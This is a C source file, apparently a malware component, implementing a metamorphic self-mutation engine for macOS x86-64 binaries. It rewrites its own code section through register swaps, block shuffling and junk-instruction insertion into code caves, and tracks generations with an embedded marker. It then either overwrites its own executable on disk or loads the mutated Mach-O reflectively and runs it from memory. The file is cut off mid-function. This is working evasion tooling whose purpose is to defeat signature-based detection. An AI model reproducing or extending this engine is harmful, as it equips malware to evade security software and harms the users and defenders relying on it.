#include <aether.h>
 
static size_t g_marker_offset = NOFFSET__;
static void clear_tx(context_t *ctx);
static bool clear_mut(context_t *ctx);

static bool reg_mut(context_t *ctx, unsigned intensity);
static bool jnk_fill(context_t *ctx, unsigned intensity);

static bool dsk_seg(context_t *ctx, size_t original_size);
static bool dsk_mut(context_t *ctx, const char *binary_path, uint64_t file_start, size_t original_size);

#ifndef FOO
static bool mem_mut(context_t *ctx, uint8_t *text_base, size_t text_size);
#endif

/* Get ASLR slide for this image by asking dyld */
intptr_t img_slide(const struct mach_header_64 *hdr) {
    if (!hdr) return 0;

    uint32_t img_count = _dyld_image_count();
    for (uint32_t i = 0; i < img_count; i++) {
        const struct mach_header_64 *h = (const struct mach_header_64 *)_dyld_get_image_header(i);
        if (h == hdr) {
            intptr_t slide = _dyld_get_image_vmaddr_slide(i);
            return slide;
        }
    }
    return 0;
}

/* Translate VM address to file offset */
uint64_t vmoffst(const struct mach_header_64 *hdr, uint64_t addr) {  
    if (!hdr) return NOFFSET__;

    intptr_t slide = img_slide(hdr);
    struct load_command *lc = (struct load_command *)((uint8_t *)hdr + sizeof(*hdr));

    for (uint32_t i = 0; i < hdr->ncmds; i++) {
        if (lc->cmd == LC_SEGMENT_64) {
            struct segment_command_64 *seg = (struct segment_command_64 *)lc;
            if (seg->vmsize == 0) { lc = (struct load_command *)((uint8_t *)lc + lc->cmdsize); continue; }

            uint64_t seg_start = seg->vmaddr + slide;
            uint64_t seg_end   = seg_start + seg->vmsize;

            if (addr >= seg_start && addr < seg_end) {
                uint64_t offset_into_seg = addr - seg_start;
                if (seg->fileoff > UINT64_MAX - offset_into_seg) return NOFFSET__;
                return seg->fileoff + offset_into_seg;
            }
        }
        lc = (struct load_command *)((uint8_t *)lc + lc->cmdsize);
    }
    return NOFFSET__;
}

/* Find __TEXT,__text section and fill out file/VM ranges */
bool text_sec(const struct mach_header_64 *hdr, text_section_t *out) { 
    if (!hdr || !out) return false;
    memset(out, 0, sizeof(*out));

    intptr_t slide = img_slide(hdr);
    struct load_command *lc = (struct load_command *)((uint8_t *)hdr + sizeof(*hdr));

    for (uint32_t i = 0; i < hdr->ncmds && i < 0xFFFF; i++) {
        if (!lc || lc->cmdsize == 0 || lc->cmdsize > UINT32_MAX / 2) break;

        if (lc->cmd == LC_SEGMENT_64) {
            struct segment_command_64 *seg = (struct segment_command_64 *)lc;
            struct section_64 *sec = (struct section_64 *)((uint8_t *)seg + sizeof(*seg));

            for (uint32_t j = 0; j < seg->nsects && j < 0xFFFF; j++) {
                if (strncmp(sec[j].sectname, "__text", 16) == 0 &&
                    strncmp(sec[j].segname, "__TEXT", 16) == 0) {

                    out->file_start = sec[j].offset;
                    out->file_end   = sec[j].offset + sec[j].size;
                    out->vm_start   = sec[j].addr + slide;
                    out->vm_end     = out->vm_start + sec[j].size;
                    return true;
                }
            }
        }

        lc = (struct load_command *)((uint8_t *)lc + lc->cmdsize);
    }

    return false;
}

/* Grow buffer by doubling until it fits needed_size */
bool Ampbuff(context_t *ctx, size_t needed_size) { 
    if (!ctx) return false;
    if (needed_size <= ctx->buffcap) return true;
    if (needed_size > SIZE_MAX / 2) return false; 

    size_t new_capacity = ctx->buffcap ? ctx->buffcap : 64;
    while (new_capacity < needed_size) {
        if (new_capacity > SIZE_MAX / 2) {
            new_capacity = SIZE_MAX;
            break;
        }
        new_capacity = new_capacity * 2;
    }

    uint8_t *tmp = realloc(ctx->working_code, new_capacity);
    if (!tmp) return false;

    ctx->working_code = tmp;
    ctx->buffcap = new_capacity;
    return true;
}

/* Does this look like real code? Check padding, decode ratio */
bool mach_O(const uint8_t *code, size_t size) {  
    if (!code || size < 16) return false;

    size_t zero_count = 0, ff_count = 0, valid_instructions = 0;
    size_t threshold = size * 9 / 10;
    size_t min_valid = size / 1024 + 1;

    for (size_t offset = 0; offset < size;) {
        uint8_t byte = code[offset];
        if (byte == 0x00) zero_count++;
        else if (byte == 0xFF) ff_count++;

        if (zero_count > threshold || ff_count > threshold) return false;

        size_t len = snap_len(code + offset, size - offset);
        if (!len || offset + len > size) {
            offset++;
            continue;
        }
        if (len > 0 && len <= 15 && is_op_ok(code + offset)) {
            valid_instructions++;
            offset += len;
        } else {
            offset++;
        }

        if (valid_instructions >= min_valid && offset > size / 2) return true;
    }

    return valid_instructions >= min_valid;
}

/* Mark regions we shouldn't mutate first/last quarters */
void crit_tap(struct mach_header_64 *hdr, uint64_t text_vm_start, 
             uint64_t *ranges, size_t *num_ranges, size_t codesz) 
{
    if (!hdr || !ranges || !num_ranges || codesz == 0) return;

    *num_ranges = 0;

    static void *hooks[] = {
        (void*)init_mut,
        (void*)boot_live,
        (void*)decode_map,
        (void*)is_chunk_ok,
        (void*)is_op_ok,
        (void*)chacha20_block,
        (void*)chacha20_random,
        (void*)chacha20_init,
        NULL
    };

    size_t num_hooks = sizeof(hooks) / sizeof(hooks[0]);

    size_t quarter = codesz / 4;
    ranges[0] = 0;
    ranges[1] = quarter;
    ranges[2] = codesz - quarter;
    ranges[3] = codesz;
    *num_ranges = 2;
    
    /* Protect generation marker region if it exists */
    if (g_marker_offset != NOFFSET__ && g_marker_offset < codesz) {
        ranges[*num_ranges * 2] = g_marker_offset;
        ranges[*num_ranges * 2 + 1] = g_marker_offset + 16;  
        (*num_ranges)++;
    }

    for (size_t i = 0; i < num_hooks && *num_ranges < (_CAPZ / 2); i++) {
        if (!hooks[i]) continue;

        uint64_t addr = (uint64_t)hooks[i];
        uint64_t off  = vmoffst(hdr, addr);

        if (off == NOFFSET__ || off >= codesz) continue;

        bool covered = false;
        for (size_t j = 0; j < *num_ranges; j++) {
            uint64_t start = ranges[j*2];
            uint64_t end   = ranges[j*2+1];
            if (off >= start && off < end) { covered = true; break; }
        }
        if (covered) continue;

        size_t window = MIN(512, codesz / 20);
        uint64_t protect_start = off > window ? off - window : 0;
        uint64_t protect_end   = MIN(off + window, codesz);

        if (protect_start >= protect_end) continue;

        ranges[*num_ranges*2]     = protect_start;
        ranges[*num_ranges*2 + 1] = protect_end;
        (*num_ranges)++;
    }
}

/* Is this offset in a protected region? */
bool chk_prot(uint64_t offset, uint64_t *ranges, size_t num_ranges) { 
    if (!ranges || num_ranges == 0) return false;
    num_ranges = MIN(num_ranges, _CAPZ);
    for (size_t i = 0; i < num_ranges; i++) {
        uint64_t start = ranges[i*2];
        uint64_t end   = ranges[i*2+1];
        if (start >= end) continue; 
        if (offset >= start && offset < end) return true;
    }
    return false;
}

/* Setup mutation context allocate buffers, seed PRNG, build CFG */
bool tx_Init(context_t *ctx, const uint8_t *code, size_t size,  
                struct mach_header_64 *hdr, uint64_t text_vm_start) {
    if (!ctx || !code || size == 0 || !hdr) return false;

    memset(ctx, 0, sizeof(*ctx));
    memset(&ctx->muttation, 0, sizeof(ctx->muttation));
    memset(&ctx->cfg, 0, sizeof(ctx->cfg));

    ctx->original_size = size;
    ctx->max_allowed_growth = size * 3;
    ctx->current_growth = 0;
    ctx->codesz = size;
    ctx->hdr = hdr;
    ctx->text_vm_start = text_vm_start;

    uint8_t *og = malloc(size);
    if (!og) return false;

    size_t initial_cap;
    if (size == 0) {
        initial_cap = 64;
    } else if (size > SIZE_MAX / 4) {
        initial_cap = SIZE_MAX;
    } else {
        initial_cap = size * 4;  
        if (initial_cap < 64) initial_cap = 64;
    }

    uint8_t *work = malloc(initial_cap);
    if (!work) {
        free(og);
        return false;
    }

    memcpy(og, code, size);
    memcpy(work, code, size);

    ctx->ogicode = og;
    ctx->working_code = work;
    ctx->buffcap = initial_cap;

    crit_tap(hdr, text_vm_start, ctx->ranges, &ctx->numcheck, ctx->codesz);

    uint8_t seed[32];
    uint64_t t = mach_absolute_time();
    pid_t pid = getpid();
    uuid_t uid;
    uuid_generate(uid);

    memcpy(seed, &t, sizeof(t));
    memcpy(seed + sizeof(t), &pid, sizeof(pid));
    memcpy(seed + sizeof(t) + sizeof(pid), uid, sizeof(uid));
    
    chacha20_init(&ctx->rng, seed, sizeof(seed));

    if (!init_mut(&ctx->muttation)) {
        clear_tx(ctx); 
        return false;
    }
    if (!ctx->muttation.entries) {
        clear_tx(ctx);
        return false;
    }

    if (!sketch_flow(ctx->working_code, ctx->codesz, &ctx->cfg)) {
        clear_tx(ctx);
        return false;
    }
    if (!ctx->cfg.blocks || ctx->cfg.cap_blocks == 0) {
        clear_tx(ctx);
        return false;
    }

    for (size_t i = 0; i < ctx->cfg.num_blocks; i++) {
        if (ctx->cfg.blocks[i].start >= ctx->codesz) {
            clear_tx(ctx);
            return false;
        }
    }

    DBG("size=%zu, blocks=%zu\n", ctx->codesz, ctx->cfg.num_blocks);
    
    return true;
}

static void clear_tx(context_t *ctx) {
    if (!ctx) return;
    
    free(ctx->ogicode);
    free(ctx->working_code);
    
    if (ctx->cfg.blocks) {
        free(ctx->cfg.blocks);
    }
    
    freeme(&ctx->muttation);
    memset(ctx, 0, sizeof(*ctx));
}

/* Decode everything and check valid/invalid ratio */
static bool clear_mut(context_t *ctx) { 
    if (!ctx || !ctx->working_code || ctx->codesz == 0) return false;

    size_t instr_capacity = 8192;
    instr_info_t *instrs = malloc(instr_capacity * sizeof(instr_info_t));
    if (!instrs) return false;

    size_t ninstr = decode_map(ctx->working_code, ctx->codesz, instrs, instr_capacity);

    if (ninstr == instr_capacity) {
        free(instrs);
        instr_capacity = _ZMAX;
        instrs = malloc(instr_capacity * sizeof(instr_info_t));
        if (!instrs) return false;
        ninstr = decode_map(ctx->working_code, ctx->codesz, instrs, instr_capacity);
    }

    if (ninstr == 0) {
        free(instrs);
        return false;
    }

    size_t total_decoded = 0;
    size_t invalid_count = 0;

    for (size_t i = 0; i < ninstr; i++) {
        if (!instrs[i].valid) invalid_count++;
        else total_decoded += instrs[i].len;
    }

    free(instrs);

    size_t max_invalid = MAX(ninstr / 100, 1);
    size_t max_padding = (ctx->codesz > 50000) ? 1024 : 16;

    if (invalid_count > max_invalid) return false;
    if (total_decoded > ctx->codesz) return false;
    if ((ctx->codesz - total_decoded) > max_padding && ctx->codesz < 50000) return false;

    return true;
}

/* Register swapping + block shuffling */
static bool reg_mut(context_t *ctx, unsigned intensity) { 
    if (!ctx || !ctx->working_code || ctx->codesz == 0 || ctx->is_shellcode) return true;

    liveness_state_t liveness;
    boot_live(&liveness);

    size_t start = ctx->codesz * _BEG;
    size_t end   = ctx->codesz * _FIN;
    size_t changes = 0;
    size_t swaps_done = 0;
    size_t max_changes = _CAP(ctx->codesz);
    size_t max_swaps   = MIN(ctx->cfg.num_blocks / 2, 8);
    bool block_changed = false;

    size_t offset = 0;
    size_t attempts = 0;
    size_t max_attempts = max_changes * 10;

    while (offset < ctx->codesz && changes < max_changes && attempts < max_attempts) {
        attempts++;

        x86_inst_t inst;
        if (!decode_x86_withme(ctx->working_code + offset, ctx->codesz - offset, 0, &inst, NULL) ||
            !inst.valid || inst.len == 0) {
            offset++;
            continue;
        }

        if (offset + inst.len > ctx->codesz) break;
        pulse_live(&liveness, offset, &inst);

        if (inst.has_modrm && inst.len >= 2 && inst.len <= 8 &&
            offset >= start && offset < end &&
            !chk_prot(offset, ctx->ranges, ctx->numcheck) &&
            !inst.is_control_flow && !inst.modifies_ip &&
            (chacha20_random(&ctx->rng) % 100) < (intensity * 20)) {

            uint8_t reg = (inst.modrm >> 3) & 7;
            uint8_t rm  = inst.modrm & 7;

            if ((reg >= 4 && reg <= 5) || (rm >= 4 && rm <= 5)) {
                offset += inst.len;
                continue;
            }

            uint8_t new_reg = jack_reg(&liveness, reg, offset, &ctx->rng);
            if (new_reg != reg && new_reg != 4 && new_reg != 5) {
                uint8_t new_modrm = (inst.modrm & 0xC7) | (new_reg << 3);
                size_t modrm_offset = offset + inst.opcode_len;

                if (modrm_offset < ctx->codesz) {
                    uint8_t backup = ctx->working_code[modrm_offset];
                    ctx->working_code[modrm_offset] = new_modrm;

                    x86_inst_t test_inst;
                    if (!(decode_x86_withme(ctx->working_code + offset, ctx->codesz - offset, 0, &test_inst, NULL) &&
                          test_inst.valid && !test_inst.ring0 && is_op_ok(ctx->working_code + offset))) {
                        ctx->working_code[modrm_offset] = backup;
                    } else {
                        changes++;
                    }
                }
            }
        }

        offset += inst.len;
    }

    if (ctx->cfg.num_blocks >= 2) {
        size_t *perm = malloc(ctx->cfg.num_blocks * sizeof(size_t));
        if (!perm) return changes > 0;

        for (size_t i = 0; i < ctx->cfg.num_blocks; i++) perm[i] = i;

        for (size_t i = ctx->cfg.num_blocks - 1; i > 0; i--) {
            if ((chacha20_random(&ctx->rng) % 100) < intensity * 15) {
                size_t j = chacha20_random(&ctx->rng) % (i + 1);
                size_t tmp = perm[i];
                perm[i] = perm[j];
                perm[j] = tmp;
            }
        }

        for (size_t i = 0; i + 1 < ctx->cfg.num_blocks && swaps_done < max_swaps; i++) {
            size_t idx_a = perm[i];
            size_t idx_b = perm[i + 1];

            size_t start_a = ctx->cfg.blocks[idx_a].start;
            size_t start_b = ctx->cfg.blocks[idx_b].start;

            if (start_a >= ctx->codesz || start_b >= ctx->codesz) continue;

            size_t len_a = (idx_a + 1 < ctx->cfg.num_blocks) ? 
                            ctx->cfg.blocks[idx_a + 1].start - start_a : ctx->codesz - start_a;
            size_t len_b = (idx_b + 1 < ctx->cfg.num_blocks) ? 
                            ctx->cfg.blocks[idx_b + 1].start - start_b : ctx->codesz - start_b;

            if (chk_prot(start_a, ctx->ranges, ctx->numcheck) || 
                chk_prot(start_b, ctx->ranges, ctx->numcheck)) continue;

            if (len_a + len_b > ctx->buffcap) continue;

            size_t min_len = MIN(len_a, len_b);
            uint8_t *tmp_buf = malloc(min_len);
            if (!tmp_buf) continue;

            memcpy(tmp_buf, ctx->working_code + start_a, min_len);
            memcpy(ctx->working_code + start_a, ctx->working_code + start_b, min_len);
            memcpy(ctx->working_code + start_b, tmp_buf, min_len);
            free(tmp_buf);

            swaps_done++;
            block_changed = true;
        }

        free(perm);
    }

    return (changes > 0) || block_changed || intensity == 0;
}

/* Find code caves sequences of 0x00/0x90/0xCC padding */
static bool cave_it(context_t *ctx, uint64_t *caves, int *num_caves) {
    if (!ctx || !caves || !num_caves || ctx->codesz == 0) return false;
    
    *num_caves = 0;
    
    instr_info_t *instrs = malloc(8192 * sizeof(instr_info_t));
    if (!instrs) return false;
    
    size_t ninstr = decode_map(ctx->working_code, ctx->codesz, instrs, 8192);
    if (ninstr == 0) {
        free(instrs);
        return false;
    }
    
    bool *is_instr_start = calloc(ctx->codesz, sizeof(bool));
    if (!is_instr_start) {
        free(instrs);
        return false;
    }
    
    for (size_t i = 0; i < ninstr; i++) {
        if (instrs[i].off < ctx->codesz) {
            is_instr_start[instrs[i].off] = true;
        }
    }
    
    size_t i = 0;
    while (i < ctx->codesz && *num_caves < _CVZ) {
        if (is_instr_start[i]) {
            i++;
            continue;
        }
        
        size_t pad_len = 0;
        size_t max_scan = MIN(ctx->codesz - i, 100);
        
        for (size_t j = 0; j < max_scan; j++) {
            uint8_t byte = ctx->working_code[i + j];
            if (byte == 0x00 || byte == 0x90 || byte == 0xCC) {
                pad_len++;
            } else {
                break;
            }
        }
        
        if (pad_len >= PAD_) {
            bool valid_cave = true;
            for (size_t k = i; k < i + pad_len && k < ctx->codesz; k++) {
                if (is_instr_start[k]) {
                    valid_cave = false;
                    break;
                }
            }
            
            if (valid_cave && !chk_prot(i, ctx->ranges, ctx->numcheck)) {
                caves[(*num_caves) * 2]     = i;
                caves[(*num_caves) * 2 + 1] = i + pad_len;
                (*num_caves)++;
                i += pad_len;
                continue;
            }
        }
        
        i++;
    }
    
    free(instrs);
    free(is_instr_start);
    
    return *num_caves > 0;
}

/* Inject valid but useless instructions into padding regions */
static bool apply_jnk(context_t *ctx, unsigned intensity, size_t max_size) {
    if (!ctx || ctx->is_shellcode) return true;

    size_t size_budget = (max_size > ctx->codesz) ? (max_size - ctx->codesz) : 0;
    if (size_budget < 16) return jnk_fill(ctx, intensity);  

    size_t junk_instr_capacity = 8192;
    instr_info_t *instrs = malloc(junk_instr_capacity * sizeof(instr_info_t));
    if (!instrs) return false;
    size_t ninstr = decode_map(ctx->working_code, ctx->codesz, instrs, junk_instr_capacity);
    if (ninstr == 0) { free(instrs); return false; }

    int changes = 0;

    for (size_t i = 0; i < ninstr && size_budget > 0; i++) {
        size_t offset = instrs[i].off;

        if (instrs[i].cf) continue;
        if (chk_prot(offset, ctx->ranges, ctx->numcheck)) continue;
        if ((chacha20_random(&ctx->rng) % 10) >= (intensity * 3)) continue;

        uint64_t caves[_CVZ * 2];
        int num_caves = 0;
        if (!cave_it(ctx, caves, &num_caves)) continue;
        
        bool in_cave = false;
        size_t cave_start = 0, cave_end = 0;
        for (int cave_idx = 0; cave_idx < num_caves; cave_idx++) {
            uint64_t c_start = caves[cave_idx * 2];
            uint64_t c_end = caves[cave_idx * 2 + 1];
            if (offset >= c_start && offset < c_end) {
                in_cave = true;
                cave_start = (size_t)c_start;
                cave_end = (size_t)c_end;
                break;
            }
        }
        if (!in_cave) continue;

        uint8_t junk_buf[8];
        size_t junk_len;
        spew_trash(junk_buf, &junk_len, &ctx->rng);

        if (offset + instrs[i].len + junk_len > cave_end) continue;
        if (!Ampbuff(ctx, ctx->codesz + junk_len)) break;

        size_t insert_point = offset + instrs[i].len;
        memmove(ctx->working_code + insert_point + junk_len,
                ctx->working_code + insert_point,
                ctx->codesz - insert_point);
        memcpy(ctx->working_code + insert_point, junk_buf, junk_len);
        ctx->codesz += junk_len;
        size_budget -= junk_len;
        changes++;

        for (size_t j = i + 1; j < ninstr; j++) {
            instrs[j].off += junk_len;
        }
    }

    free(instrs);
    return changes >= 0;
}

/* In-place mutations (same size) */
static bool jnk_fill(context_t *ctx, unsigned intensity) {
    if (!ctx || ctx->codesz == 0) return false;

    int changes = 0;
    size_t offset = 0;

    size_t start = (ctx->codesz * 3) / 10;
    size_t end   = (ctx->codesz * 7) / 10;

    while (offset < ctx->codesz) {
        x86_inst_t inst;
        if (!decode_x86_withme(ctx->working_code + offset, ctx->codesz - offset, 0, &inst, NULL) || !inst.valid) {
            offset++;
            continue;
        }

        if (offset < start || offset >= end) { 
            offset += inst.len; 
            continue; 
        }
        
        if (chk_prot(offset, ctx->ranges, ctx->numcheck) || inst.is_control_flow) {
            offset += inst.len;
            continue;
        }

        if ((chacha20_random(&ctx->rng) % 100) >= (intensity * 10)) {
            offset += inst.len; 
            continue;
        }

        uint8_t backup[16];
        memcpy(backup, ctx->working_code + offset, inst.len);
        bool mutated = false;

        if (inst.len == 2 && inst.raw[0] == 0x89 && inst.has_modrm) {
            uint8_t modrm = inst.raw[1];
            uint8_t mod = (modrm >> 6) & 3;
            
            if (mod == 3) {
                uint8_t r1 = chacha20_random(&ctx->rng) % 8;
                uint8_t r2 = chacha20_random(&ctx->rng) % 8;
                
                // stack pointers and same-register
                if (r1 != 4 && r1 != 5 && r2 != 4 && r2 != 5 && r1 != r2) {
                    ctx->working_code[offset]     = 0x89;
                    ctx->working_code[offset + 1] = 0xC0 | (r1 << 3) | r2;
                    mutated = true;
                }
            }
        } else if (inst.len == 3 && inst.raw[0] == 0x48 && inst.raw[1] == 0x89 && inst.has_modrm) {
            uint8_t modrm = inst.raw[2];
            uint8_t mod = (modrm >> 6) & 3;
            
            if (mod == 3) {
                uint8_t r1 = chacha20_random(&ctx->rng) % 8;
                uint8_t r2 = chacha20_random(&ctx->rng) % 8;
                
                if (r1 != 4 && r1 != 5 && r2 != 4 && r2 != 5 && r1 != r2) {
                    ctx->working_code[offset]     = 0x48;
                    ctx->working_code[offset + 1] = 0x89;
                    ctx->working_code[offset + 2] = 0xC0 | (r1 << 3) | r2;
                    mutated = true;
                }
            }
        } else if (inst.len == 3 && inst.raw[0] == 0x48 && inst.raw[1] == 0x31 && inst.has_modrm) {
            uint8_t modrm = inst.raw[2];
            uint8_t mod = (modrm >> 6) & 3;
            
            if (mod == 3) {
                uint8_t r1 = chacha20_random(&ctx->rng) % 8;
                uint8_t r2 = chacha20_random(&ctx->rng) % 8;
                
                if (r1 != 4 && r1 != 5 && r2 != 4 && r2 != 5) {
                    ctx->working_code[offset]     = 0x48;
                    ctx->working_code[offset + 1] = 0x31;
                    ctx->working_code[offset + 2] = 0xC0 | (r1 << 3) | r2;
                    mutated = true;
                }
            }
        }

        if (mutated) {
            x86_inst_t test_inst;
            if (!(decode_x86_withme(ctx->working_code + offset, ctx->codesz - offset, 0, &test_inst, NULL) && 
                  test_inst.valid && test_inst.len == inst.len)) {
                memcpy(ctx->working_code + offset, backup, inst.len);
            } else {
                changes++;
            }
        }
        
        offset += inst.len > 0 ? inst.len : 1;
    }

    return changes > 0;
}

/* Main mutation pipeline expansion, mutations, register swaps, junk injection */
bool mOrph(context_t *ctx, unsigned generation, size_t max_size) {    
    if (!ctx || !ctx->working_code || ctx->codesz == 0) return false;

    size_t disk_limit = max_size;
    size_t memory_limit = ctx->buffcap;
    bool memory_only = (ctx->codesz >= disk_limit);
    
#ifdef FOO 
    /* Disable expansions for disk mutation */
    size_t expansion_limit = 0;
    size_t growth_budget = 0;
#else
    size_t expansion_limit = memory_only ? memory_limit : disk_limit;
    size_t growth_budget = (expansion_limit > ctx->codesz) ? (expansion_limit - ctx->codesz) : 0;
#endif
    
    if (growth_budget <= 0) {
        return reg_mut(ctx, generation) || jnk_fill(ctx, generation);
    }

    size_t needed_capacity = ctx->codesz + growth_budget;
    if (!Ampbuff(ctx, needed_capacity)) return false;

    uint8_t *backup_code = malloc(ctx->buffcap);
    if (!backup_code) return false;
    memcpy(backup_code, ctx->working_code, ctx->codesz);
    size_t backup_sz = ctx->codesz;

    unsigned intensity = (generation == 1) ? 2 : (generation + 1);
    if (intensity > 5) intensity = 8;

    bool success = true;
    size_t size_before_expansion = ctx->codesz;

    liveness_state_t liveness;
    boot_live(&liveness);
    size_t max_expand_size = expansion_limit;
    
#ifndef FOO
    if (generation >= 5 && ctx->codesz < max_expand_size) {
        unsigned depth = 1 + (generation / 10);
        if (depth > 3) depth = 3;
        
        size_t new_size = expand_with_chains(
            ctx->working_code, ctx->codesz, max_expand_size,
            &liveness, &ctx->rng, depth, intensity * 2
        );
        
        if (new_size > ctx->codesz && new_size <= max_expand_size) {
            ctx->codesz = new_size;
            ctx->current_growth = ctx->codesz - ctx->original_size;
        }
    }
    
    if (ctx->codesz < max_expand_size) {
        size_t new_size = expand_code_section(
            ctx->working_code, ctx->codesz, max_expand_size,
            &liveness, &ctx->rng, intensity * 2
        );
        
        if (new_size > ctx->codesz && new_size <= max_expand_size) {
            ctx->codesz = new_size;
            ctx->current_growth = ctx->codesz - ctx->original_size;
        }
    }
#endif
    
    if (ctx->codesz != size_before_expansion) {
        if (ctx->cfg.blocks) {
            free(ctx->cfg.blocks);
            ctx->cfg.blocks = NULL;
        }
        
        if (!sketch_flow(ctx->working_code, ctx->codesz, &ctx->cfg)) {
            goto rollback;
        }
        
        crit_tap(ctx->hdr, ctx->text_vm_start, ctx->ranges, &ctx->numcheck, ctx->codesz);
    }

    if (generation >= 3) {
        engine_context_t engine_ctx;
        init_engine(&engine_ctx);
        mutate(ctx->working_code, ctx->codesz, &ctx->rng, generation, &engine_ctx);
    }

    bool reg_success = reg_mut(ctx, intensity);
    bool jnk_success = jnk_fill(ctx, intensity);
    
    if (!reg_success && !jnk_success) {
        reg_success = reg_mut(ctx, intensity + 2);
        jnk_success = jnk_fill(ctx, intensity + 2);
        if (!reg_success && !jnk_success) {
            goto rollback;
        }
    }

    size_t remaining_budget = (ctx->codesz < max_size) ? (max_size - ctx->codesz) : 0;
    if (remaining_budget > 0) {
        uint64_t cool[16]; 
        int coolnum = 0;
        cave_it(ctx, cool, &coolnum);
        
        if (coolnum > 0) {
            success = apply_jnk(ctx, intensity / 2, ctx->codesz + remaining_budget);
            if (!success) goto rollback;
        }
    }

    if (!clear_mut(ctx)) goto rollback;
    if (!mach_O(ctx->working_code, ctx->codesz)) goto rollback;
    
    size_t decode_errors = 0;
    size_t offset = 0;
    while (offset < ctx->codesz) {
        x86_inst_t inst;
        if (!decode_x86_withme(ctx->working_code + offset, ctx->codesz - offset, 0, &inst, NULL) ||
            !inst.valid || inst.len == 0) {
            decode_errors++;
            offset++;
            continue;
        }
        offset += inst.len;
    }
    
    size_t max_errors = ctx->codesz / 100;
    if (decode_errors > max_errors) goto rollback;

    DBG("gen=%u, %zu->%zu (+%.1f%%)\n", generation, backup_sz, ctx->codesz,
        100.0 * (ctx->codesz - backup_sz) / backup_sz);

    free(backup_code);
    return true;

rollback:
    memcpy(ctx->working_code, backup_code, backup_sz);
    ctx->codesz = backup_sz;
    ctx->current_growth = (backup_sz > ctx->original_size) ? (backup_sz - ctx->original_size) : 0;
    free(backup_code);
    return false;
}

// Final validation before disk write
static bool dsk_seg(context_t *ctx, size_t original_size) {     
    if (!clear_mut(ctx)) return false;
    if (ctx->codesz > original_size * 4) return false;
    
    instr_info_t *cf_instrs = malloc(8192 * sizeof(instr_info_t));
    if (!cf_instrs) return false;
    size_t cf_ninstr = decode_map(ctx->working_code, ctx->codesz, cf_instrs, 8192);
    if (cf_ninstr == 0) {
        free(cf_instrs);
        return false;
    }
    
    free(cf_instrs);
    if (!is_chunk_ok(ctx->working_code, ctx->codesz)) return false;

    size_t invalid_ops = 0;
    for (size_t offset = 0; offset < ctx->codesz; ) {
        if (!is_op_ok(ctx->working_code + offset)) {
            invalid_ops++;
        }
        
        size_t len = 1;
        x86_inst_t inst;
        if (decode_x86_withme(ctx->working_code + offset, ctx->codesz - offset, 0, &inst, NULL) && inst.valid) {
            len = inst.len;
        }

        offset += len;
        if (offset >= ctx->codesz) break;
    }
    
    if (invalid_ops > 0) return false;
    
    return true;
}

/* Validate, write to disk, pad with NOPs, read back to verify */
static bool dsk_mut(context_t *ctx, const char *binary_path,  
                               uint64_t file_start, size_t original_size) {
    
    if (!dsk_seg(ctx, original_size)) return false;
    
    size_t write_size = ctx->codesz;
    if (write_size > original_size) return false;
    
    int fd = open(binary_path, O_RDWR);
    if (fd < 0) {
        return false;
    }
    
    if (lseek(fd, (off_t)file_start, SEEK_SET) == (off_t)-1) {
        close(fd);
        return false;
    }
    
    ssize_t written = write(fd, ctx->working_code, write_size);
    if (written != (ssize_t)write_size) {
        close(fd);
        return false;
    }
    
    if (write_size < original_size) {
        size_t pad_size = original_size - write_size;
        uint8_t *nop_pad = malloc(pad_size);
        if (nop_pad) {
            memset(nop_pad, 0x90, pad_size);
            write(fd, nop_pad, pad_size);
            free(nop_pad);
        }
    }
    close(fd);

    int verify_fd = open(binary_path, O_RDONLY);
    if (verify_fd >= 0) {
        if (lseek(verify_fd, (off_t)file_start, SEEK_SET) != (off_t)-1) {
            uint8_t *readback = malloc(write_size);
            if (readback) {
                ssize_t read_bytes = read(verify_fd, readback, write_size);
                if (read_bytes == (ssize_t)write_size) {
                    if (memcmp(readback, ctx->working_code, write_size) == 0) {
                        if (!is_chunk_ok(readback, write_size)) {
                            free(readback);
                            close(verify_fd);
                            return false;
                        }
                    } else {
                        free(readback);
                        close(verify_fd);
                        return false;
                    }
                }
                free(readback);
            }
        }
        close(verify_fd);
    }
    return true;
}

#ifndef FOO
/* Apply mutations via reflective loading RELEASE mode path */
static bool mem_mut(context_t *ctx, uint8_t *text_base, size_t text_size) {
    if (!ctx || !ctx->working_code || ctx->codesz == 0) {
        return false;
    }
    
    (void)text_base;
    
    DBG("  Original size: %zu bytes\n", text_size);
    DBG("  Mutated size:  %zu bytes\n", ctx->codesz);
    DBG("  Growth:        %.1f%%\n", 100.0 * (ctx->codesz - text_size) / text_size);
    
    size_t mutations_count = 0;
    size_t compare_size = MIN(ctx->codesz, text_size);
    for (size_t i = 0; i < compare_size; i++) {
        if (ctx->working_code[i] != ctx->ogicode[i]) {
            mutations_count++;
        }
    }
    
    DBG("  Mutations %zu bytes changed\n", mutations_count);
    
    if (mutations_count == 0) {
        return false;
    }
    
    if (!mach_O(ctx->working_code, ctx->codesz)) {
        return false;
    }
    
    size_t macho_size = 0;
    uint8_t *macho_binary = wrap_macho(ctx->working_code, ctx->codesz, &macho_size);
    
    if (!macho_binary) {DBG("Failed to wrap\n");return false;}
    
    DBG("Wrapped in Mach-O structure (%zu bytes)\n", macho_size);
    
    if (!V_machO(macho_binary, macho_size)) {
        DBG("Mach-O verification failed\n");
        free(macho_binary);
        return false;
    }
    
    DBG("Mach-O V Passed\n");
    
    bool success = exec_mem(macho_binary, macho_size);
    
    if (success) {
        // 
    } else {
        panic(); // Go Sideways
    }
    
    free(macho_binary);
    
    return success;
}

#endif

/* Find generation marker in code by scanning for magic value */
static marker_t* find_marker(uint8_t *code, size_t size) {
    if (size < sizeof(marker_t)) return NULL;
    
    for (size_t i = 0; i <= size - sizeof(marker_t); i++) {
        /* Search for magic byte sequence */
        if (memcmp(code + i, MORPH_MAGIC, 8) == 0) {
            marker_t *marker = (marker_t *)(code + i);
            /* Verify checksum simple XOR */
            uint32_t expected = marker->generation ^ 0xAE7B;
            if (marker->checksum == expected) {
                return marker;
            }
        }
    }
    return NULL;
}

/* Embed generation marker in code */
static size_t embed_marker(uint8_t *code, size_t size, uint32_t generation) {
    marker_t new_marker;
    memcpy(new_marker.magic, MORPH_MAGIC, 8);
    new_marker.generation = generation;
    new_marker.checksum = generation ^ 0xAE7B;
    
    /* Update existing marker if found */
    marker_t *existing = find_marker(code, size);
    if (existing) {
        size_t offset = (uint8_t*)existing - code;
        existing->generation = generation;
        existing->checksum = generation ^ 0xAE7B;
        DBG("[*] Updated existing marker at 0x%zx\n", offset);
        return offset;
    }
    
    /* Look for padding (0x90, 0x00, 0xCC) we need at least 16 contiguous bytes */
    size_t padding_offset = NOFFSET__;
    size_t padding_len = 0;
    
